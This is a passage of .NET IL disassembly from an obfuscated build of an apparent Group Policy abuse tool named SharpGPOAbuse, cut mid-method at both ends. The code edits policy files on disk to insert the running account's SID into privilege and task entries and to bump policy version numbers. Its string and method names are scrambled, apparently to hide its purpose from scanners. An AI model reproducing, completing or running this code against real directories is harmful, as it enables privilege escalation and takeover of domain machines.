    IL_009d:  stelem.ref
    IL_009e:  dup
    IL_009f:  ldc.i4.1
    IL_00a0:  ldsfld     string _Thread
    IL_00a5:  stelem.ref
    IL_00a6:  dup
    IL_00a7:  ldc.i4.2
    IL_00a8:  ldsfld     string __ComObject
    IL_00ad:  ldloc.1
    IL_00ae:  callvirt   instance class [mscorlib]System.Security.Principal.SecurityIdentifier [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.Principal::get_Sid()
    IL_00b3:  callvirt   instance string [mscorlib]System.Security.Principal.IdentityReference::get_Value()
    IL_00b8:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_00bd:  stelem.ref
    IL_00be:  stloc.s    V_4
    IL_00c0:  ldc.i4.6
    IL_00c1:  newarr     [mscorlib]System.String
    IL_00c6:  dup
    IL_00c7:  ldc.i4.0
    IL_00c8:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_00cd:  ldlen
    IL_00ce:  add
    IL_00cf:  ldsfld     string CompatibilityFlag
    IL_00d4:  stelem.ref
    IL_00d5:  dup
    IL_00d6:  ldc.i4.1
    IL_00d7:  ldarg.1
    IL_00d8:  stelem.ref
    IL_00d9:  dup
    IL_00da:  ldc.i4.2
    IL_00db:  ldsfld     string Console
    IL_00e0:  stelem.ref
    IL_00e1:  dup
    IL_00e2:  ldc.i4.3
    IL_00e3:  ldarg.1
    IL_00e4:  stelem.ref
    IL_00e5:  dup
    IL_00e6:  ldc.i4.4
    IL_00e7:  ldsfld     string CriticalFinalizerObject
    IL_00ec:  stelem.ref
    IL_00ed:  dup
    IL_00ee:  ldc.i4.5
    IL_00ef:  ldloc.2
    IL_00f0:  stelem.ref
    IL_00f1:  call       string [mscorlib]System.String::Concat(string[])
    IL_00f6:  stloc.s    V_5
    IL_00f8:  ldloc.s    V_5
    IL_00fa:  ldsfld     string ConsoleCancelEventHandler
    IL_00ff:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0104:  stloc.s    V_6
    IL_0106:  ldloc.s    V_5
    IL_0108:  call       bool [mscorlib]System.IO.Directory::Exists(string)
    IL_010d:  brfalse    IL_0125

    IL_0112:  ldloc.s    V_5
    IL_0114:  ldsfld     string ConsoleCancelEventArgs
    IL_0119:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_011e:  stloc.s    V_5
    IL_0120:  br         IL_013c

    IL_0125:  ldsfld     string ConsoleColor
    IL_012a:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_012f:  ldc.i4.0
    IL_0130:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_0135:  ldlen
    IL_0136:  sub
    IL_0137:  call       void [mscorlib]System.Environment::Exit(int32)
    IL_013c:  ldloc.s    V_5
    IL_013e:  call       bool [mscorlib]System.IO.Directory::Exists(string)
    IL_0143:  brtrue     IL_0150

    IL_0148:  ldloc.s    V_5
    IL_014a:  call       class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.Directory::CreateDirectory(string)
    IL_014f:  pop
    IL_0150:  ldloc.s    V_5
    IL_0152:  ldsfld     string ConsoleKey
    IL_0157:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_015c:  stloc.s    V_5
    IL_015e:  ldloc.s    V_5
    IL_0160:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_0165:  brfalse    IL_0420

    IL_016a:  ldc.i4.0
    IL_016b:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_0170:  ldlen
    IL_0171:  add
    IL_0172:  stloc.s    V_7
    IL_0174:  ldsfld     string ConsoleKeyInfo
    IL_0179:  ldloc.s    V_5
    IL_017b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0180:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0185:  ldloc.s    V_5
    IL_0187:  call       string[] [mscorlib]System.IO.File::ReadAllLines(string)
    IL_018c:  stloc.s    V_8
    IL_018e:  ldloc.s    V_8
    IL_0190:  stloc.s    V_9
    IL_0192:  ldc.i4.0
    IL_0193:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_0198:  ldlen
    IL_0199:  sub
    IL_019a:  stloc.s    V_10
    IL_019c:  br         IL_01c7

    IL_01a1:  ldloc.s    V_9
    IL_01a3:  ldloc.s    V_10
    IL_01a5:  ldelem     [mscorlib]System.String
    IL_01aa:  ldsfld     string ConsoleModifiers
    IL_01af:  callvirt   instance bool [mscorlib]System.String::Contains(string)
    IL_01b4:  brfalse    IL_01c1

    IL_01b9:  ldc.i4.1
    IL_01ba:  call       int32 '<Module>'(int32)
    IL_01bf:  stloc.s    V_7
    IL_01c1:  ldloc.s    V_10
    IL_01c3:  ldc.i4.1
    IL_01c4:  add
    IL_01c5:  stloc.s    V_10
    IL_01c7:  ldloc.s    V_10
    IL_01c9:  ldloc.s    V_9
    IL_01cb:  ldlen
    IL_01cc:  conv.i4
    IL_01cd:  blt.s      IL_01a1

    IL_01cf:  ldloc.s    V_7
    IL_01d1:  brfalse    IL_01f4

    IL_01d6:  ldarg.s    StoreOperationSetCanonicalizationContext
    IL_01d8:  brtrue     IL_01f4

    IL_01dd:  ldsfld     string ConsoleSpecialKey
    IL_01e2:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_01e7:  ldc.i4.0
    IL_01e8:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_01ed:  ldlen
    IL_01ee:  sub
    IL_01ef:  call       void [mscorlib]System.Environment::Exit(int32)
    IL_01f4:  ldloc.s    V_7
    IL_01f6:  ldarg.s    StoreOperationSetCanonicalizationContext
    IL_01f8:  and
    IL_01f9:  brfalse    IL_0368

    IL_01fe:  ldloc.s    V_5
    IL_0200:  newobj     instance void [mscorlib]System.IO.StreamWriter::.ctor(string)
    IL_0205:  stloc.s    V_11
    .try
    {
      IL_0207:  ldloc.s    V_8
      IL_0209:  stloc.s    V_9
      IL_020b:  ldc.i4.0
      IL_020c:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_0211:  ldlen
      IL_0212:  sub
      IL_0213:  stloc.s    V_10
      IL_0215:  br         IL_0327

      IL_021a:  ldloc.s    V_9
      IL_021c:  ldloc.s    V_10
      IL_021e:  ldelem     [mscorlib]System.String
      IL_0223:  stloc.s    V_12
      IL_0225:  ldloc.s    V_12
      IL_0227:  ldsfld     string ContextMarshalException
      IL_022c:  ldsfld     string Convert
      IL_0231:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0236:  ldsfld     string Base64FormattingOptions
      IL_023b:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0240:  brfalse    IL_0313

      IL_0245:  ldloc.s    V_12
      IL_0247:  ldsfld     string ContextBoundObject
      IL_024c:  ldsfld     string ContextStaticAttribute
      IL_0251:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0256:  ldsfld     string StringFreezingAttribute
      IL_025b:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0260:  brfalse    IL_02b0

      IL_0265:  ldloc.s    V_12
      IL_0267:  ldsfld     string Currency
      IL_026c:  ldsfld     string TimeZone
      IL_0271:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0276:  ldsfld     string CurrentSystemTimeZone
      IL_027b:  call       int32 [mscorlib]System.String::Compare(string,
                                                                  string)
      IL_0280:  ldc.i4.0
      IL_0281:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_0286:  ldlen
      IL_0287:  add
      IL_0288:  ble        IL_02b0

      IL_028d:  ldloc.s    V_11
      IL_028f:  ldloc.s    V_12
      IL_0291:  ldsfld     string DayOfWeek
      IL_0296:  ldloc.1
      IL_0297:  callvirt   instance class [mscorlib]System.Security.Principal.SecurityIdentifier [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.Principal::get_Sid()
      IL_029c:  callvirt   instance string [mscorlib]System.Security.Principal.IdentityReference::get_Value()
      IL_02a1:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02a6:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_02ab:  br         IL_031c

      IL_02b0:  ldloc.s    V_12
      IL_02b2:  ldsfld     string DBNull
      IL_02b7:  ldsfld     string Decimal
      IL_02bc:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_02c1:  ldsfld     string Binder
      IL_02c6:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_02cb:  brfalse    IL_031c

      IL_02d0:  ldloc.s    V_12
      IL_02d2:  ldsfld     string DefaultBinder
      IL_02d7:  ldsfld     string IObjectReference
      IL_02dc:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_02e1:  ldsfld     string DelegateSerializationHolder
      IL_02e6:  call       int32 [mscorlib]System.String::Compare(string,
                                                                  string)
      IL_02eb:  brtrue     IL_031c

      IL_02f0:  ldloc.s    V_11
      IL_02f2:  ldloc.s    V_12
      IL_02f4:  ldsfld     string DivideByZeroException
      IL_02f9:  ldloc.1
      IL_02fa:  callvirt   instance class [mscorlib]System.Security.Principal.SecurityIdentifier [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.Principal::get_Sid()
      IL_02ff:  callvirt   instance string [mscorlib]System.Security.Principal.IdentityReference::get_Value()
      IL_0304:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0309:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_030e:  br         IL_031c

      IL_0313:  ldloc.s    V_11
      IL_0315:  ldloc.s    V_12
      IL_0317:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_031c:  ldloc.s    V_10
      IL_031e:  ldc.i4.1
      IL_031f:  call       int32 '<Module>'(int32)
      IL_0324:  add
      IL_0325:  stloc.s    V_10
      IL_0327:  ldloc.s    V_10
      IL_0329:  ldloc.s    V_9
      IL_032b:  ldlen
      IL_032c:  conv.i4
      IL_032d:  blt        IL_021a

      IL_0332:  leave      IL_0346

    }  // end .try
    finally
    {
      IL_0337:  ldloc.s    V_11
      IL_0339:  brfalse    IL_0345

      IL_033e:  ldloc.s    V_11
      IL_0340:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0345:  endfinally
    }  // end handler
    IL_0346:  ldarg.1
    IL_0347:  ldarg.s    StoreOperationSetDeploymentMetadata
    IL_0349:  ldarg.3
    IL_034a:  ldloc.s    V_6
    IL_034c:  ldsfld     string Double
    IL_0351:  ldsfld     string DuplicateWaitObjectException
    IL_0356:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IIDENTITYAUTHORITY_DOES_DEFINITION_MATCH_REFERENCE_FLAGS(string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string)
    IL_035b:  ldc.i4.0
    IL_035c:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_0361:  ldlen
    IL_0362:  sub
    IL_0363:  call       void [mscorlib]System.Environment::Exit(int32)
    IL_0368:  ldloc.s    V_7
    IL_036a:  brtrue     IL_0499

    IL_036f:  ldsfld     string Empty
    IL_0374:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0379:  ldloc.s    V_5
    IL_037b:  newobj     instance void [mscorlib]System.IO.StreamWriter::.ctor(string)
    IL_0380:  stloc.s    V_13
    .try
    {
      IL_0382:  ldloc.s    V_8
      IL_0384:  stloc.s    V_9
      IL_0386:  ldc.i4.0
      IL_0387:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_038c:  ldlen
      IL_038d:  add
      IL_038e:  stloc.s    V_10
      IL_0390:  br         IL_03b4

      IL_0395:  ldloc.s    V_9
      IL_0397:  ldloc.s    V_10
      IL_0399:  ldelem     [mscorlib]System.String
      IL_039e:  stloc.s    V_14
      IL_03a0:  ldloc.s    V_13
      IL_03a2:  ldloc.s    V_14
      IL_03a4:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_03a9:  ldloc.s    V_10
      IL_03ab:  ldc.i4.1
      IL_03ac:  call       int32 '<Module>'(int32)
      IL_03b1:  add
      IL_03b2:  stloc.s    V_10
      IL_03b4:  ldloc.s    V_10
      IL_03b6:  ldloc.s    V_9
      IL_03b8:  ldlen
      IL_03b9:  conv.i4
      IL_03ba:  blt.s      IL_0395

      IL_03bc:  ldloc.s    V_4
      IL_03be:  stloc.s    V_9
      IL_03c0:  ldc.i4.0
      IL_03c1:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_03c6:  ldlen
      IL_03c7:  sub
      IL_03c8:  stloc.s    V_10
      IL_03ca:  br         IL_03ee

      IL_03cf:  ldloc.s    V_9
      IL_03d1:  ldloc.s    V_10
      IL_03d3:  ldelem     [mscorlib]System.String
      IL_03d8:  stloc.s    V_15
      IL_03da:  ldloc.s    V_13
      IL_03dc:  ldloc.s    V_15
      IL_03de:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_03e3:  ldloc.s    V_10
      IL_03e5:  ldc.i4.1
      IL_03e6:  call       int32 '<Module>'(int32)
      IL_03eb:  add
      IL_03ec:  stloc.s    V_10
      IL_03ee:  ldloc.s    V_10
      IL_03f0:  ldloc.s    V_9
      IL_03f2:  ldlen
      IL_03f3:  conv.i4
      IL_03f4:  blt.s      IL_03cf

      IL_03f6:  leave      IL_040a

    }  // end .try
    finally
    {
      IL_03fb:  ldloc.s    V_13
      IL_03fd:  brfalse    IL_0409

      IL_0402:  ldloc.s    V_13
      IL_0404:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0409:  endfinally
    }  // end handler
    IL_040a:  ldarg.1
    IL_040b:  ldarg.s    StoreOperationSetDeploymentMetadata
    IL_040d:  ldarg.3
    IL_040e:  ldloc.s    V_6
    IL_0410:  ldsfld     string TypeLoadException
    IL_0415:  ldsfld     string EntryPointNotFoundException
    IL_041a:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IIDENTITYAUTHORITY_DOES_DEFINITION_MATCH_REFERENCE_FLAGS(string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string)
    IL_041f:  ret

    IL_0420:  ldsfld     string DllNotFoundException
    IL_0425:  ldloc.s    V_5
    IL_0427:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_042c:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_0431:  ldnull
    IL_0432:  stloc.s    V_16
    IL_0434:  ldloc.s    V_4
    IL_0436:  stloc.s    V_9
    IL_0438:  ldc.i4.0
    IL_0439:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_043e:  ldlen
    IL_043f:  add
    IL_0440:  stloc.s    V_10
    IL_0442:  br         IL_046d

    IL_0447:  ldloc.s    V_9
    IL_0449:  ldloc.s    V_10
    IL_044b:  ldelem     [mscorlib]System.String
    IL_0450:  stloc.s    V_17
    IL_0452:  ldloc.s    V_16
    IL_0454:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_0459:  ldloc.s    V_17
    IL_045b:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0460:  stloc.s    V_16
    IL_0462:  ldloc.s    V_10
    IL_0464:  ldc.i4.1
    IL_0465:  call       int32 '<Module>'(int32)
    IL_046a:  add
    IL_046b:  stloc.s    V_10
    IL_046d:  ldloc.s    V_10
    IL_046f:  ldloc.s    V_9
    IL_0471:  ldlen
    IL_0472:  conv.i4
    IL_0473:  blt.s      IL_0447

    IL_0475:  ldloc.s    V_5
    IL_0477:  ldloc.3
    IL_0478:  ldloc.s    V_16
    IL_047a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_047f:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                     string)
    IL_0484:  ldarg.1
    IL_0485:  ldarg.s    StoreOperationSetDeploymentMetadata
    IL_0487:  ldarg.3
    IL_0488:  ldloc.s    V_6
    IL_048a:  ldsfld     string EnvironmentVariableTarget
    IL_048f:  ldsfld     string Environment
    IL_0494:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IIDENTITYAUTHORITY_DOES_DEFINITION_MATCH_REFERENCE_FLAGS(string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string)
    IL_0499:  ret
  } // end of method IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::StoreOperationPinDeployment

  .method public hidebysig static void  StoreOperationScavenge(string StoreTransactionOperationType,
                                                               string StoreTransactionOperation,
                                                               string StoreTransactionData,
                                                               string Store,
                                                               string IStore_BindingResult_BoundVersion,
                                                               string IStore_BindingResult,
                                                               string IStore) cil managed
  {
    // Code size       1055 (0x41f)
    .maxstack  32
    .locals init ([0] string V_0,
             [1] string V_1,
             [2] string V_2,
             [3] string V_3,
             [4] string V_4,
             [5] valuetype [mscorlib]System.IO.FileAttributes V_5,
             [6] class [mscorlib]System.Collections.Generic.List`1<string> V_6,
             [7] class [mscorlib]System.IO.StreamReader V_7,
             [8] string V_8,
             [9] class [mscorlib]System.Collections.Generic.List`1<int32> V_9,
             [10] string V_10,
             [11] valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string> V_11,
             [12] string V_12,
             [13] char V_13,
             [14] int32 V_14,
             [15] class [mscorlib]System.IO.StreamWriter V_15,
             [16] string V_16,
             [17] int32 V_17)
    IL_0000:  ldarg.3
    IL_0001:  ldarg.s    IStore_BindingResult_BoundVersion
    IL_0003:  ldarg.s    IStore_BindingResult
    IL_0005:  call       string SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::ISTORE_ENUM_FILES_FLAGS(string,
                                                                                                                            string,
                                                                                                                            string)
    IL_000a:  stloc.0
    IL_000b:  ldc.i4.6
    IL_000c:  newarr     [mscorlib]System.String
    IL_0011:  dup
    IL_0012:  ldc.i4.0
    IL_0013:  ldsfld     string EventHandler
    IL_0018:  stelem.ref
    IL_0019:  dup
    IL_001a:  ldc.i4.1
    IL_001b:  ldarg.2
    IL_001c:  stelem.ref
    IL_001d:  dup
    IL_001e:  ldc.i4.2
    IL_001f:  ldsfld     string EventHandler`1
    IL_0024:  stelem.ref
    IL_0025:  dup
    IL_0026:  ldc.i4.3
    IL_0027:  ldarg.2
    IL_0028:  stelem.ref
    IL_0029:  dup
    IL_002a:  ldc.i4.4
    IL_002b:  ldsfld     string FieldAccessException
    IL_0030:  stelem.ref
    IL_0031:  dup
    IL_0032:  ldc.i4.5
    IL_0033:  ldloc.0
    IL_0034:  stelem.ref
    IL_0035:  call       string [mscorlib]System.String::Concat(string[])
    IL_003a:  stloc.1
    IL_003b:  ldc.i4.6
    IL_003c:  newarr     [mscorlib]System.String
    IL_0041:  dup
    IL_0042:  ldc.i4.0
    IL_0043:  ldsfld     string FlagsAttribute
    IL_0048:  stelem.ref
    IL_0049:  dup
    IL_004a:  ldc.i4.1
    IL_004b:  call       int32 '<Module>'(int32)
    IL_0050:  ldarg.2
    IL_0051:  stelem.ref
    IL_0052:  dup
    IL_0053:  ldc.i4.2
    IL_0054:  ldsfld     string FormatException
    IL_0059:  stelem.ref
    IL_005a:  dup
    IL_005b:  ldc.i4.3
    IL_005c:  ldarg.2
    IL_005d:  stelem.ref
    IL_005e:  dup
    IL_005f:  ldc.i4.4
    IL_0060:  ldsfld     string GCCollectionMode
    IL_0065:  stelem.ref
    IL_0066:  dup
    IL_0067:  ldc.i4.5
    IL_0068:  ldloc.0
    IL_0069:  stelem.ref
    IL_006a:  call       string [mscorlib]System.String::Concat(string[])
    IL_006f:  stloc.2
    IL_0070:  ldarg.s    IStore
    IL_0072:  ldsfld     string GCNotificationStatus
    IL_0077:  callvirt   instance bool [mscorlib]System.String::Equals(string)
    IL_007c:  brfalse    IL_00ce

    IL_0081:  ldc.i4.8
    IL_0082:  newarr     [mscorlib]System.String
    IL_0087:  dup
    IL_0088:  ldc.i4.0
    IL_0089:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_008e:  stelem.ref
    IL_008f:  dup
    IL_0090:  ldc.i4.1
    IL_0091:  ldsfld     string GC
    IL_0096:  stelem.ref
    IL_0097:  dup
    IL_0098:  ldc.i4.2
    IL_0099:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_009e:  stelem.ref
    IL_009f:  dup
    IL_00a0:  ldc.i4.3
    IL_00a1:  ldsfld     string Guid
    IL_00a6:  stelem.ref
    IL_00a7:  dup
    IL_00a8:  ldc.i4.4
    IL_00a9:  ldarg.0
    IL_00aa:  stelem.ref
    IL_00ab:  dup
    IL_00ac:  ldc.i4.5
    IL_00ad:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_00b2:  stelem.ref
    IL_00b3:  dup
    IL_00b4:  ldc.i4.6
    IL_00b5:  ldsfld     string IAsyncResult
    IL_00ba:  stelem.ref
    IL_00bb:  dup
    IL_00bc:  ldc.i4.7
    IL_00bd:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_00c2:  stelem.ref
    IL_00c3:  call       string [mscorlib]System.String::Concat(string[])
    IL_00c8:  stloc.3
    IL_00c9:  br         IL_0116

    IL_00ce:  ldc.i4.8
    IL_00cf:  newarr     [mscorlib]System.String
    IL_00d4:  dup
    IL_00d5:  ldc.i4.0
    IL_00d6:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_00db:  stelem.ref
    IL_00dc:  dup
    IL_00dd:  ldc.i4.1
    IL_00de:  ldsfld     string ICustomFormatter
    IL_00e3:  stelem.ref
    IL_00e4:  dup
    IL_00e5:  ldc.i4.2
    IL_00e6:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_00eb:  stelem.ref
    IL_00ec:  dup
    IL_00ed:  ldc.i4.3
    IL_00ee:  ldsfld     string IFormatProvider
    IL_00f3:  stelem.ref
    IL_00f4:  dup
    IL_00f5:  ldc.i4.4
    IL_00f6:  ldarg.0
    IL_00f7:  stelem.ref
    IL_00f8:  dup
    IL_00f9:  ldc.i4.5
    IL_00fa:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_00ff:  stelem.ref
    IL_0100:  dup
    IL_0101:  ldc.i4.6
    IL_0102:  ldsfld     string IndexOutOfRangeException
    IL_0107:  stelem.ref
    IL_0108:  dup
    IL_0109:  ldc.i4.7
    IL_010a:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_010f:  stelem.ref
    IL_0110:  call       string [mscorlib]System.String::Concat(string[])
    IL_0115:  stloc.3
    IL_0116:  ldloc.1
    IL_0117:  ldsfld     string InsufficientMemoryException
    IL_011c:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0121:  stloc.s    V_4
    IL_0123:  ldloc.1
    IL_0124:  call       bool [mscorlib]System.IO.Directory::Exists(string)
    IL_0129:  brfalse    IL_015c

    IL_012e:  ldarg.s    IStore
    IL_0130:  ldsfld     string Int16
    IL_0135:  callvirt   instance bool [mscorlib]System.String::Equals(string)
    IL_013a:  brfalse    IL_015c

    IL_013f:  ldloc.1
    IL_0140:  ldsfld     string Int32
    IL_0145:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_014a:  stloc.1
    IL_014b:  ldloc.2
    IL_014c:  ldsfld     string Int64
    IL_0151:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0156:  stloc.2
    IL_0157:  br         IL_01ac

    IL_015c:  ldloc.1
    IL_015d:  call       bool [mscorlib]System.IO.Directory::Exists(string)
    IL_0162:  brfalse    IL_0195

    IL_0167:  ldarg.s    IStore
    IL_0169:  ldsfld     string IntPtr
    IL_016e:  callvirt   instance bool [mscorlib]System.String::Equals(string)
    IL_0173:  brfalse    IL_0195

    IL_0178:  ldloc.1
    IL_0179:  ldsfld     string Internal
    IL_017e:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0183:  stloc.1
    IL_0184:  ldloc.2
    IL_0185:  ldsfld     string InvalidCastException
    IL_018a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_018f:  stloc.2
    IL_0190:  br         IL_01ac

    IL_0195:  ldsfld     string InvalidOperationException
    IL_019a:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_019f:  ldc.i4.0
    IL_01a0:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_01a5:  ldlen
    IL_01a6:  sub
    IL_01a7:  call       void [mscorlib]System.Environment::Exit(int32)
    IL_01ac:  ldloc.1
    IL_01ad:  call       bool [mscorlib]System.IO.Directory::Exists(string)
    IL_01b2:  brtrue     IL_01be

    IL_01b7:  ldloc.1
    IL_01b8:  call       class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.Directory::CreateDirectory(string)
    IL_01bd:  pop
    IL_01be:  ldloc.1
    IL_01bf:  ldarg.0
    IL_01c0:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_01c5:  stloc.1
    IL_01c6:  ldloc.1
    IL_01c7:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_01cc:  brfalse    IL_01e8

    IL_01d1:  ldsfld     string InvalidProgramException
    IL_01d6:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_01db:  ldc.i4.0
    IL_01dc:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_01e1:  ldlen
    IL_01e2:  add
    IL_01e3:  call       void [mscorlib]System.Environment::Exit(int32)
    IL_01e8:  ldloc.2
    IL_01e9:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_01ee:  brfalse    IL_0393

    IL_01f3:  ldloc.2
    IL_01f4:  call       valuetype [mscorlib]System.IO.FileAttributes [mscorlib]System.IO.File::GetAttributes(string)
    IL_01f9:  stloc.s    V_5
    IL_01fb:  ldloc.s    V_5
    IL_01fd:  ldc.i4.2
    IL_01fe:  and
    IL_01ff:  ldc.i4.2
    IL_0200:  bne.un     IL_0214

    IL_0205:  ldloc.s    V_5
    IL_0207:  ldc.i4.s   -3
    IL_0209:  and
    IL_020a:  stloc.s    V_5
    IL_020c:  ldloc.2
    IL_020d:  ldloc.s    V_5
    IL_020f:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                      valuetype [mscorlib]System.IO.FileAttributes)
    IL_0214:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<string>::.ctor()
    IL_0219:  stloc.s    V_6
    IL_021b:  ldloc.2
    IL_021c:  newobj     instance void [mscorlib]System.IO.StreamReader::.ctor(string)
    IL_0221:  stloc.s    V_7
    .try
    {
      IL_0223:  br         IL_0231

      IL_0228:  ldloc.s    V_6
      IL_022a:  ldloc.s    V_8
      IL_022c:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_0231:  ldloc.s    V_7
      IL_0233:  callvirt   instance string [mscorlib]System.IO.TextReader::ReadLine()
      IL_0238:  dup
      IL_0239:  stloc.s    V_8
      IL_023b:  brtrue.s   IL_0228

      IL_023d:  leave      IL_0251

    }  // end .try
    finally
    {
      IL_0242:  ldloc.s    V_7
      IL_0244:  brfalse    IL_0250

      IL_0249:  ldloc.s    V_7
      IL_024b:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0250:  endfinally
    }  // end handler
    IL_0251:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<int32>::.ctor()
    IL_0256:  stloc.s    V_9
    IL_0258:  ldsfld     string IServiceProvider
    IL_025d:  stloc.s    V_10
    IL_025f:  ldloc.s    V_6
    IL_0261:  callvirt   instance valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<!0> class [mscorlib]System.Collections.Generic.List`1<string>::GetEnumerator()
    IL_0266:  stloc.s    V_11
    .try
    {
      IL_0268:  br         IL_02b8

      IL_026d:  ldloca.s   V_11
      IL_026f:  call       instance !0 valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>::get_Current()
      IL_0274:  stloc.s    V_12
      .try
      {
        IL_0276:  ldloc.s    V_12
        IL_0278:  ldc.i4.0
        IL_0279:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
        IL_027e:  ldlen
        IL_027f:  add
        IL_0280:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
        IL_0285:  stloc.s    V_13
        IL_0287:  ldloca.s   V_13
        IL_0289:  call       instance string [mscorlib]System.Char::ToString()
        IL_028e:  ldsfld     string LocalDataStore
        IL_0293:  ldsfld     string LdsSyncHelper
        IL_0298:  call       string [System]System.Text.RegularExpressions.Regex::Replace(string,
                                                                                          string,
                                                                                          string)
        IL_029d:  stloc.s    V_10
        IL_029f:  ldloc.s    V_9
        IL_02a1:  ldloc.s    V_10
        IL_02a3:  call       int32 [mscorlib]System.Int32::Parse(string)
        IL_02a8:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<int32>::Add(!0)
        IL_02ad:  leave      IL_02b8

      }  // end .try
      catch [mscorlib]System.Object 
      {
        IL_02b2:  pop
        IL_02b3:  leave      IL_02b8

      }  // end handler
      IL_02b8:  ldloca.s   V_11
      IL_02ba:  call       instance bool valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>::MoveNext()
